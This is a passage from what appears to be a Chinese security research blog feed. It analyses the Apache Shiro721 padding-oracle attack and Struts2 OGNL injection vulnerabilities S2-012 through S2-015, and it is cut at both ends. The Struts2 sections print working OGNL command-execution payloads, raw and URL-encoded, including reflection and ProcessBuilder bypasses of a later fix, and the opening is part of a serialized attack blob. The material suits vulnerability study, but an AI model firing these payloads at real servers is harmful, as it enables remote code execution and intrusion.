class="hljs-regexp">/Kv+w3D5AzY0aNuAg5W47BCWAIK6Uo7RvmVKOEJ4BY/</span>eCzb1MZgEzLv33CcGMwrAj+O4jW0pWLSfaSykY3UTbKL01OnBrru7c233SIrcef47RpJYmT66hk5N8ocMufLu0AaL9LcMu2p3EtzWUjPHY4P<span class="hljs-regexp">/P4OqQ45hsBkEPWhs1hgWvKoP24INrh1+vRV6gBiJ7yc37GR8ss8+Hegj6ccSjdzSg3Wg/</span>n987w<span class="hljs-regexp">/NUlpL8UYfJ08vbMwc7k0X8tqvivg2zEbVRT50evpy+LMgCqmMcZE02WAvNovoWuLZSkSQ/</span>B6It4uYDvdhRa7efrTYJItzSnaBwd7eNV70Md17pF5slCvmMfPoHWE0aQBYJFgbvLIFMxjyeUpwjQbL6hzqR8<span class="hljs-regexp">/8lXaFP6u9vA89YKLZstFcG6miv+GE2/</span>qAx2ZgSKCZ2+MZH6IhGg+<span class="hljs-number">98</span>sby<span class="hljs-regexp">/kGETEDbXGEk9M3n4QdgGaE6IeVg6BHHK4/</span>BfT3Y6xY2sreazN478mUhyv1qJw9ybpUwrzdbZeSci4+CD9U19Qpxdylh3W7BTYeVhI0mR9K09CH94zXzyKpv4VuxDLBGomFLGX5hlDvq23M6<span class="hljs-regexp">/nXF/</span>U4LRFCBS+<span class="hljs-number">2</span>pfkmj<span class="hljs-regexp">/MXMyiJ8fCkKov96OTpZybriibSY3ydKF6Zve+clPk+eRGp4r0gz8usz0tkfKxSGzoA7vjJtowEijVfKybjQqDckc1dv5DTlXpRiWlhomlywu33WYi57LGIvyfk197zXRgqDCfZzOB5m1VHnGn4n36qjW4g2EeJThZQx6pThIgzzom1nVjn8cDuPjTpC7B6pOezgISzlMT3XykuBBdOG++w7mKn2dZdYNKhYKaMJ7YYdXcEmUUJPc0u02usvLVgK/</span>IgNzLmRYJWuONEqlluqu6RYyxLp3BCmaYXDHhQxXPodalFnrXyvw3tLSahX74v4FdszCkYbPCIfsmweAjyO<span class="hljs-regexp">/+C2z7Iu4w5OaXkrAlko2kWWOIcKSO+Tf5w/</span>hIORRVPyE3J5tj0WmSc4VKGRI2JFJD0yoWvevMLq1VV6YZZibFAbZl7LE0FHyxMw2XINEswdeyIdH8WgAhZj8ynfO78h6z9aPAS15DGgxfRgnDQXRsDghV/D+<span class="hljs-number">6</span>CbXNewTtNvnpym8d7wIxlNqcOWh7eebI7qxDBu8cBFXJ63p1hMiNg69sTAMcnELDHI5fglaDwjaUKPeSZ3dw==<br></code></pre></td></tr></table></figure><p>看到是可以执行成功的</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250420201255464.png" alt="image-20250420201255464"></p><h2 id="Shiro721"><a href="#Shiro721" class="headerlink" title="Shiro721"></a>Shiro721</h2><p>影响版本：shiro &lt; 1.4.2  (1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1)</p><p>在 shiro550 中，官方使用的加密 key 是硬编码在源代码中的，这给了攻击者利用解密的过程可以传入带有攻击的 RememberMe 载荷。</p><p>在 shiro721 中，官方是在 shiro 的内部动态生成一个用于加密的 key，不过默认使用的 AES-128-CBC 模式加密，这种加密模式可以使用 Padding Oracle Attack 攻击技术，爆破中间值，从而可以构造精心设置的 payload</p><p>关于加密模式是如何破解的，可以看这位师傅的文章：<a href="https://goodapple.top/archives/217">CBC 字节翻转攻击&amp;Padding Oracle Attack 原理解析 - 枫 のBlog</a> 讲的很详细了</p><p>简单描述一下：</p><p>加密过程：</p><ol><li>对明文数据进行分组和填充，按照 BlockSize 8 字节，分成若干组，最后一组不足 8 字节，缺 <code>?</code> 位，用 <code>0x?</code> 填充。例如（abcd0x40x40x40x4 或者 abcde0x30x30x3）</li><li>用 <code>IV </code> 和 <code>第一组明文</code> 异或得到 <code>中间值(1)</code> , 然后中间值做 AES 加密，得到 <code>第一组密文</code></li><li>利用 上一次获得的 <code>第一组密文</code> ，作为下一组的 <code>IV</code> 和 <code>第二组明文</code> 进行异或得到 <code>中间值(2)</code> 进行 AES 加密，得到第二组密文</li><li>递归上述操作，得到完整的密文</li><li>把 <code>IV</code> 拼接到密文的最前方 进行传递</li></ol><p>解密过程其实就是反过了</p><ol><li>把拿到的密文分组 8 字节一组，除第一组 <code>IV</code> 外，分别做 AES 解密，获得 <code>中间值(1)</code>, <code>中间值(2)</code>, <code>中间值(3)</code> …..</li><li><code>IV</code> 和 <code>中间值(1)</code> 异或拿到第一组明文</li><li><code>第一组密文</code> 和 <code>中间值(2)</code> 异或拿到第二组明文</li></ol><p><code>IV</code> 和 整体的密文的 base64 编码就是 RemeberMe 字段，也就是说在 shiro 中 <code>IV</code> 和 <code>密文</code> 是可控的</p><p>我们可以控制 <code>IV</code> 的八个字节，先让整体为 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00，去异或根据抛出的异常在尝试 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x01 ~~~ 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0xFF 一定会有一次让明文为 <code>adcdefg0x01</code> 的形式，这个填充是正确的，相当于是分组的时候，长度不够 8 个字节，填充了一位 0x01</p><p>假设 尝试的 <code>IV</code> 为 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x3F</p><p>那么我们可以用 0x3F 异或 0x01 的到 <code>中间值</code> 最后一位 为 0x3E</p><p>知道中间值了 我只需要让 <code>IV</code> 为 <code>？</code> 令 <code>a 异或 0x3E = ？</code> 。这样 我们就可以控制的到的明文最后一位是 <code>a</code></p><p>也就是经过多次爆破后，我们可以把 整组的中间值给爆破出来，利用异或去构造特定的 payload</p><p>Padding Oracle Attack 的基本原理就是这样，简单文字描述了一下，文章讲的很清楚，我就不抄录了。</p><p>其实 shiro721 并不是 shiro 内部逻辑的问题，而是采用的加密算法是可爆破的，给攻击者提供了一种方式，不过要正常爆破一个可用的 payload，其爆破的数量是庞大的，利用起来还是有一定的被封 ip 的可能</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/news/12148">Java 反序列化之 Shiro 反序列化利用-先知社区</a></p><p><a href="https://xz.aliyun.com/news/12505">深入探究 Shiro 漏洞成因及攻击技术-先知社区</a></p><p><a href="https://www.javasec.org/java-vuls/shiro/Shiro-1.html">https://www.javasec.org/java-vuls/shiro/Shiro-1.html</a></p><p><a href="https://goodapple.top/archives/217">CBC 字节翻转攻击&amp;Padding Oracle Attack 原理解析 - 枫 のBlog</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
      <category>Shiro</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>Shiro</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>struts2反序列化12-61</title>
    <link href="/2025/04/14/struts2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9612-61/"/>
    <url>/2025/04/14/struts2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9612-61/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h2 id="S2-012"><a href="#S2-012" class="headerlink" title="S2-012"></a>S2-012</h2><p>影响版本：Struts Showcase App 2.0.0 - Struts Showcase App 2.3.14.2 </p><p>参考链接：<a href="https://cwiki.apache.org/confluence/display/WW/S2-012">https://cwiki.apache.org/confluence/display/WW/S2-012</a></p><p>这与 S2-001 很相似，在设置了结果重定向，Struts2 使用 StrutsResultSupport 的子类 ServletRedirectResult 类处理 redirect 结果，会造成二次解析</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;redirect&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;redirect&quot;</span>&gt;</span>/index.jsp?name=$&#123;name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><img src="https://gitee.com/ling-x5/img/raw/master/PixPin_2025-04-10_19-04-48.gif" alt="PixPin_2025-04-10_19-04-48" style="zoom:50%;" /><p>重定向会来到 org.apache.struts2.dispatcher.ServletRedirectResult#execute</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410191420093.png" alt="image-20250410191420093"></p><p>父类的 execute 方法，里面调用了 conditionalParse 进而调用了 translateVariables</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410191551363.png" alt="image-20250410191551363"></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410192023432.png" alt="image-20250410192023432"></p><p>后续就和 S2-001 的步骤一样了，循环解析 ognl 表达式</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">translateVariables:<span class="hljs-number">198</span>, TextParseUtil (com<span class="hljs-selector-class">.opensymphony</span><span class="hljs-selector-class">.xwork2</span>.util)<br>translateVariables:<span class="hljs-number">129</span>, TextParseUtil (com<span class="hljs-selector-class">.opensymphony</span><span class="hljs-selector-class">.xwork2</span>.util)<br>translateVariables:<span class="hljs-number">73</span>, TextParseUtil (com<span class="hljs-selector-class">.opensymphony</span><span class="hljs-selector-class">.xwork2</span>.util)<br>conditionalParse:<span class="hljs-number">198</span>, StrutsResultSupport (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.dispatcher)<br>execute:<span class="hljs-number">185</span>, StrutsResultSupport (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.dispatcher)<br>execute:<span class="hljs-number">158</span>, ServletRedirectResult (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.dispatcher)<br></code></pre></td></tr></table></figure><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs d">%&#123;#_memberAccess[<span class="hljs-string">&quot;allowStaticMethodAccess&quot;</span>]=<span class="hljs-literal">true</span>,<span class="hljs-keyword">@java</span>.lang.Runtime<span class="hljs-keyword">@getRuntime</span>().exec(<span class="hljs-string">&quot;calc&quot;</span>)&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410192202409.png" alt="image-20250410192202409"></p><h2 id="S2-013"><a href="#S2-013" class="headerlink" title="S2-013"></a>S2-013</h2><p>影响版本：Struts 2.0.0 - Struts 2.3.14.1 </p><p>参考链接：<a href="https://cwiki.apache.org/confluence/display/WW/S2-013">https://cwiki.apache.org/confluence/display/WW/S2-013</a></p><p>与 S2-002 的 xss 很相似，不过当时忽略了，这其实是可以解析 ognl 执行命令的</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;s:url <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attribute">action</span>=<span class="hljs-string">&quot;HelloWorld&quot;</span> <span class="hljs-attribute">includeParams</span>=<span class="hljs-string">&quot;all&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>当配置 <code>includeParams=&quot;all&quot;</code> 时，会接受所有的 get 和 post 参数，进行解析</p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>官方给出的 POC</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">HelloWorld.action?fakeParam=%25%7B(%23_memberAccess%5B<span class="hljs-string">&#x27;allowStaticMethodAccess&#x27;</span>%5D%3Dtrue)(%23context%5B<span class="hljs-string">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span>%5D%3Dfalse)(%23writer%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23writer.println(<span class="hljs-string">&#x27;hacked&#x27;</span>)%2C%23writer.close())%7D<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410194534766.png" alt="image-20250410194534766"></p><p>当然肯定也是可以实现命令执行的</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs d">fakeParam=%&#123;#_memberAccess[<span class="hljs-string">&quot;allowStaticMethodAccess&quot;</span>]=<span class="hljs-literal">true</span>,<span class="hljs-keyword">@java</span>.lang.Runtime<span class="hljs-keyword">@getRuntime</span>().exec(<span class="hljs-string">&quot;calc&quot;</span>)&#125;<br></code></pre></td></tr></table></figure><p>url 编码后</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">fakeParam<span class="hljs-operator">=</span><span class="hljs-variable">%25</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%23</span>_memberAccess<span class="hljs-variable">%5</span>b<span class="hljs-variable">%22</span>allowStaticMethodAccess<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%3</span>dtrue<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%40</span>java.lang.Runtime<span class="hljs-variable">%40</span>getRuntime().exec(<span class="hljs-variable">%22</span>calc<span class="hljs-variable">%22</span>)<span class="hljs-variable">%7</span>d<br></code></pre></td></tr></table></figure><p>我们在 doStartTag 打断点，分析一下 ，前边调试基本与 S2-002 一致</p><p>在调用 doStartTag 的时候，处理 includeParam &#x3D; all 时，调用到 <code>ServletUrlRenderer#includeGetParameters</code> 进而调用了 <code>UrlHelper#parseQueryString</code> </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410200247524.png" alt="image-20250410200247524"></p><p>调用栈</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">parseQueryString:<span class="hljs-number">328</span>, UrlHelper (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span><span class="hljs-selector-class">.views</span>.util)<br>parseQueryString:<span class="hljs-number">308</span>, UrlHelper (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span><span class="hljs-selector-class">.views</span>.util)<br>includeGetParameters:<span class="hljs-number">265</span>, ServletUrlRenderer (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.components)<br>beforeRenderUrl:<span class="hljs-number">243</span>, ServletUrlRenderer (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.components)<br>start:<span class="hljs-number">144</span>, URL (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.components)<br>doStartTag:<span class="hljs-number">53</span>, ComponentTagSupport (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span><span class="hljs-selector-class">.views</span>.jsp)<br></code></pre></td></tr></table></figure><p>看到调用 translateAndDecode  跟进去就是在调用 translateVariable </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410200316465.png" alt="image-20250410200316465"></p><p>后续同样，跟 S2-001 一样了</p><h2 id="S2-014"><a href="#S2-014" class="headerlink" title="S2-014"></a>S2-014</h2><p>影响版本： Struts 2.0.0 - Struts 2.3.14.1</p><p>参考链接： <a href="https://cwiki.apache.org/confluence/display/WW/S2-014">https://cwiki.apache.org/confluence/display/WW/S2-014</a></p><p>其实就是对 S2-013 的另一种 payload 攻击</p><p>因为在 translateVariable 的解析中，会解析 <code>%</code> 和 <code>$</code> 两种开头标识</p><p>这里官方也给出了对应的 payload</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">HelloWorld.action?aaa=<span class="hljs-number">1</span>$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,@java.lang.Runtime@getRuntime().<span class="hljs-keyword">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><p>url 编码后</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">HelloWorld</span>.action?aaa=<span class="hljs-number">1</span>%<span class="hljs-number">24</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">23</span>_memberAccess%<span class="hljs-number">5</span>b%<span class="hljs-number">22</span>allowStaticMethodAccess%<span class="hljs-number">22</span>%<span class="hljs-number">5</span>d%<span class="hljs-number">3</span>dtrue%<span class="hljs-number">2</span>c%<span class="hljs-number">40</span>java.lang.Runtime%<span class="hljs-number">40</span>getRuntime().exec(%<span class="hljs-number">22</span>calc%<span class="hljs-number">22</span>)%<span class="hljs-number">7</span>d<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410202343567.png" alt="image-20250410202343567"></p><h2 id="S2-015"><a href="#S2-015" class="headerlink" title="S2-015"></a>S2-015</h2><p>影响版本：Struts 2.0.0 - Struts 2.3.14.2 </p><p>参考链接：<a href="https://cwiki.apache.org/confluence/display/WW/S2-015">https://cwiki.apache.org/confluence/display/WW/S2-015</a> </p><p>Struts 2 允许基于通配符定义动作映射，如下例所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;*&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;example.ExampleSupport&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>/example/&#123;1&#125;.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当 Struts 2 找不到 action 时，就会去匹配通配符 <code>*</code> 并解析，用 <code>&#123;1&#125;</code> 当作 ognl 表达式来解析并获取值</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>官方给出的 POC</p><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk"><span class="hljs-string">$&#123;</span><span class="hljs-symbol">#foo</span>=<span class="hljs-string">&#x27;Menu&#x27;</span>,<span class="hljs-symbol">#foo</span>&#125;<br></code></pre></td></tr></table></figure><p>url 编码后</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%24</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%23</span>foo<span class="hljs-variable">%3</span>d<span class="hljs-variable">%27</span>Menu<span class="hljs-variable">%27</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>foo<span class="hljs-variable">%7</span>d<br></code></pre></td></tr></table></figure><p>可以看到的确解析了我们 ognl 表达式，去寻找 Menu.jsp 文件</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410212627921.png" alt="image-20250410212627921"></p><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们首先是在 <code>StrutsPrepareAndExecuteFilter#doFilter</code> 或者 <code>FilterDispatcher#doFilter</code> 这个方法 预处理请求</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xl">旧版本流程：<br>F<span class="hljs-function"><span class="hljs-title">ilterDispatcher</span> -&gt;</span> A<span class="hljs-function"><span class="hljs-title">ctionProxy</span> -&gt;</span> DefaultActionInvocation<br><br>新版本流程：<br>S<span class="hljs-function"><span class="hljs-title">trutsPrepareAndExecuteFilter</span> -&gt;</span> A<span class="hljs-function"><span class="hljs-title">ctionProxy</span> -&gt;</span> DefaultActionInvocation<br></code></pre></td></tr></table></figure><p>我们会来到 DefaultActionInvocation#executeResult 处理结果</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250411093317878.png" alt="image-20250411093317878"></p><p>接着在 StrutsResultSupport#execute 中调用 conditionalParse </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250411093426145.png" alt="image-20250411093426145"></p><p>后边结合 S2-012 的流程一致了，调用 TextParseUtil#translateVariables 解析 ognl 表达式</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250411093701762.png" alt="image-20250411093701762"></p><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">%&#123;#_memberAccess[<span class="hljs-string">&#x27;allowStaticMethodAccess&#x27;</span>]=<span class="hljs-keyword">true</span>,<span class="hljs-meta">@java</span>.lang.Runtime<span class="hljs-meta">@getRuntime</span>().exec(<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;.action<br></code></pre></td></tr></table></figure><p>url 编码后</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%25</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%23</span>_memberAccess<span class="hljs-variable">%5</span>b<span class="hljs-variable">%27</span>allowStaticMethodAccess<span class="hljs-variable">%27</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%3</span>dtrue<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%40</span>java.lang.Runtime<span class="hljs-variable">%40</span>getRuntime().exec(<span class="hljs-variable">%27</span>calc<span class="hljs-variable">%27</span>)<span class="hljs-variable">%7</span>d.action<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250411100136738.png" alt="image-20250411100136738"></p><blockquote><p>注意这里使用 <code>&#39;</code> 来进行包裹，使用 <code>“”</code> 包裹，会被转义，从而无法执行</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250411100400080.png" alt="image-20250411100400080"></p></blockquote><p>具体就是发生在 StrutsActionProxy 初始化的时候，封装 actionName 会对他进行实体编码</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250411101315385.png" alt="image-20250411101315385"></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250411102155084.png" alt="image-20250411102155084"></p><p>调用栈</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">escape:<span class="hljs-number">869</span>, Entities (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span>.lang)<br>escapeHtml:<span class="hljs-number">505</span>, StringEscapeUtils (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span>.lang)<br>escapeHtml:<span class="hljs-number">461</span>, StringEscapeUtils (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span>.lang)<br>&lt;init&gt;:<span class="hljs-number">77</span>, DefaultActionProxy (com<span class="hljs-selector-class">.opensymphony</span>.xwork2)<br>&lt;init&gt;:<span class="hljs-number">38</span>, StrutsActionProxy (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.impl)<br>createActionProxy:<span class="hljs-number">37</span>, StrutsActionProxyFactory (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.impl)<br>createActionProxy:<span class="hljs-number">58</span>, DefaultActionProxyFactory (com<span class="hljs-selector-class">.opensymphony</span>.xwork2)<br>serviceAction:<span class="hljs-number">488</span>, Dispatcher (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.dispatcher)<br>doFilter:<span class="hljs-number">434</span>, FilterDispatcher (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.dispatcher)<br></code></pre></td></tr></table></figure><h3 id="Struts-2-3-14-2"><a href="#Struts-2-3-14-2" class="headerlink" title="Struts 2.3.14.2"></a>Struts 2.3.14.2</h3><p>在 Struts 2.3.14.2 中，官方将 SecurityMemberAccess 类中成员变量 allowStaticMethodAccess 添加了 final 修饰符，并且将其 set 方法进行了删除。</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250411103903928.png" alt="image-20250411103903928"></p><p>看到打之前的 payload 已经不能实现命令执行了</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250411104246518.png" alt="image-20250411104246518"></p><p>这里有两种绕过的方式</p><ol><li>使用反射修改值</li></ol><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$&#123;<span class="hljs-selector-id">#context</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span>]</span>=false,#f=#_memberAccess<span class="hljs-selector-class">.getClass</span>()<span class="hljs-selector-class">.getDeclaredField</span>(<span class="hljs-string">&#x27;allowStaticMethodAccess&#x27;</span>),<span class="hljs-selector-id">#f</span><span class="hljs-selector-class">.setAccessible</span>(true),<span class="hljs-selector-id">#f</span><span class="hljs-selector-class">.set</span>(#_memberAccess,true),@java<span class="hljs-selector-class">.lang</span>.Runtime@<span class="hljs-built_in">getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;.action<br></code></pre></td></tr></table></figure><p>url 编码</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%24</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%23</span>context<span class="hljs-variable">%5</span>b<span class="hljs-variable">%27</span>xwork.MethodAccessor.denyMethodExecution<span class="hljs-variable">%27</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%3</span>dfalse<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>f<span class="hljs-variable">%3</span>d<span class="hljs-variable">%23</span>_memberAccess.getClass().getDeclaredField(<span class="hljs-variable">%27</span>allowStaticMethodAccess<span class="hljs-variable">%27</span>)<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>f.setAccessible(<span class="hljs-keyword">true</span>)<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>f.set(<span class="hljs-variable">%23</span>_memberAccess<span class="hljs-variable">%2</span>ctrue)<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%40</span>java.lang.Runtime<span class="hljs-variable">%40</span>getRuntime().exec(<span class="hljs-variable">%27</span>calc<span class="hljs-variable">%27</span>)<span class="hljs-variable">%7</span>d.action<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250411111021332.png" alt="image-20250411111021332"></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250411111036753.png" alt="image-20250411111036753"></p><ol start="2"><li>使用非静态方法</li></ol><blockquote><p>由于双引号 会被 实体编码，我们只能使用单引号</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$&#123;<span class="hljs-selector-id">#context</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span>]</span>=false,#pb=new java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.ProcessBuilder</span>(new java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.String</span><span class="hljs-selector-attr">[]</span>&#123;<span class="hljs-string">&#x27;calc&#x27;</span>&#125;),<span class="hljs-selector-id">#pb</span><span class="hljs-selector-class">.start</span>()&#125;.action<br></code></pre></td></tr></table></figure><p>url 编码后</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-meta">%24</span><span class="hljs-meta">%7B</span><span class="hljs-meta">%23context</span><span class="hljs-meta">%5B</span><span class="hljs-string">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%3Dfalse</span><span class="hljs-meta">%2C</span><span class="hljs-meta">%23pb</span><span class="hljs-meta">%3Dnew</span><span class="hljs-meta">%20java</span><span class="hljs-built_in">.lang</span>.ProcessBuilder(new<span class="hljs-meta">%20java</span><span class="hljs-built_in">.lang</span>.String<span class="hljs-meta">%5B</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%7B</span><span class="hljs-string">&#x27;calc&#x27;</span><span class="hljs-meta">%7D</span>)<span class="hljs-meta">%2C</span><span class="hljs-meta">%23pb</span>.<span class="hljs-keyword">start</span>()<span class="hljs-meta">%7D</span>.action<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412211502638.png" alt="image-20250412211502638"></p><h2 id="S2-016"><a href="#S2-016" class="headerlink" 